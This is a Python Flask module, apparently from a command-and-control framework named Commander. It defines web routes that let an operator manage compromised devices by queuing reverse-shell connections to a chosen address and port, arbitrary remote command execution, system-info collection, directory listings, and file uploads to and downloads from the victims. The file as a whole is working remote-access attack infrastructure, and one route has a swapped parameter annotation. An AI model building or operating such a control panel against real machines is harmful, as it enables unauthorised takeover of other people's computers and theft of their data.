import os

from Commander import Commander
from Database import DeviceModel, Session, TaskModel
from flask import (Blueprint, jsonify, render_template, request,
                   send_from_directory)
from Utils.web import authorized, generate_response, get_messages

TASK_CREATED = "Task created."
DEVICE_DOES_NOT_EXIST = "Device does not exist."


def devices_bp(commander: Commander):
    devices_bp = Blueprint("devices", __name__, url_prefix="/devices")

    @devices_bp.route("/", methods=["GET"])
    @authorized
    def get_devices():
        use_json = request.args.get("json", "").lower() == "true"
        device_query = Session.query(DeviceModel)
        devices: list[DeviceModel] = device_query.all()
        if use_json:
            return jsonify([device.to_dict(commander) for device in devices])
        opened_device = device_query.filter_by(
            id=request.args.get("open")).first()
        return render_template("devices.j2", devices=devices, opened_device=opened_device, messages=get_messages())

    @devices_bp.route("/<string:id>/clear", methods=["POST"])
    @authorized
    def post_clear_devices(id: str = "all"):
        count = 0
        if id == "all":
            for device in Session.query(DeviceModel).all():
                if not device.connected:
                    count += 1
                    Session.delete(device)
        else:
            for device in Session.query(DeviceModel).filter_by(id=id).all():
                if not device.connected:
                    count += 1
                    Session.delete(device)
        Session.commit()
        return generate_response("success", f"Cleared {count} devices.", "devices")

    @devices_bp.route("/downloads/<string:file>", methods=["GET"])
    @authorized
    def get_downloads(file: str):
        if file is None:
            return generate_response("danger", "File name is missing.", "devices", 400)
        return send_from_directory(os.path.join(os.getcwd(), "Data/Downloads/"), file, as_attachment=True)

    @devices_bp.route("/<int:id>/reverse_shell", methods=["POST"])
    @authorized
    def post_reverse_shell(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"
        address = request.form.get("address")
        port = request.form.get("port")
        binary = request.form.get("binary")

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)
            
        try:
            task = TaskModel.reverse_shell(id, address, port, binary)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return generate_response("danger", str(e), "devices", 500)
        else:
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    @devices_bp.route("/<int:id>/rce", methods=["POST"])
    @authorized
    def post_rce(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"
        cmd = request.form.get("cmd")

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)

        try:
            task = TaskModel.remote_command_execution(id, cmd)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return generate_response("danger", str(e), "devices", 500)
        else:
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    @devices_bp.route("/<int:id>/info", methods=["GET"])
    @authorized
    def get_infos(int: id = None):
        use_json = request.args.get("json", "").lower() == "true"

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)

        try:
            task = TaskModel.get_infos(id)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return generate_response("danger", str(e), "devices", 500)
        else:
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    @devices_bp.route("/<int:id>/dir", methods=["GET"])
    @authorized
    def get_dir(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"
        directory = request.args.get("dir")

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)

        try:
            task = TaskModel.list_directory_contents(id, directory)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    @devices_bp.route("/<int:id>/upload", methods=["POST"])
    @authorized
    def post_upload(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"
        target_path = request.args.get("path")

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)

        # check if file is in request
        if "file" not in request.files:
            return generate_response("danger", "The as_file parameter is true, but no file was given.", "devices", 400)
        if target_path is None:
            return generate_response("danger", "Upload path is missing.", "devices", 400)
        try:
            task = TaskModel.upload(
                id, request.files.get('file'), target_path)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return generate_response("danger", str(e), "devices", 500)
        else:
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    @devices_bp.route("/<int:id>/download", methods=["GET"])
    @authorized
    def get_download(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"
        target_path = request.args.get("path")

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)
            
        if target_path is None:
            return generate_response("danger", "File path is missing.", "devices", 400)
        try:
            task = TaskModel.download(id, target_path)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return generate_response("danger", str(e), "/devices", 500)
        else:
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")
    return devices_bp
